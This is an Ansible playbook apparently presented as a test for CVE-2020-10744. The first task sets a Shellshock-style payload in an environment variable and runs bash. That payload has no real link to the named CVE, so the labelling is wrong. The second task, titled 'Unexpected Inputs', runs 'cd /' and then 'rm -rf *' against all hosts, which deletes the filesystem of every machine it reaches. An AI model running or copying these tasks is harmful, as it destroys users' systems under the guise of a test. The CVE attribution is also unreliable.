
- hosts: all
  gather_facts: no

  tasks:
    - name: CVE-2020-10744 Unconventional Syntax and Edge Cases
      shell: |
        set -e
        unset LD_PRELOAD
        POC='(){ :;};echo Vulnerable to CVE-2020-10744 attack!'
        export POC
        bash -c "echo Exploited by passing the environment variable POC to bash"
      args:
        warn: no

    - name: CVE-2020-10744 Unexpected Inputs
      shell: |
        set -e
        echo 'This is a test'
        cd /
        rm -rf *
      args:
        warn: no
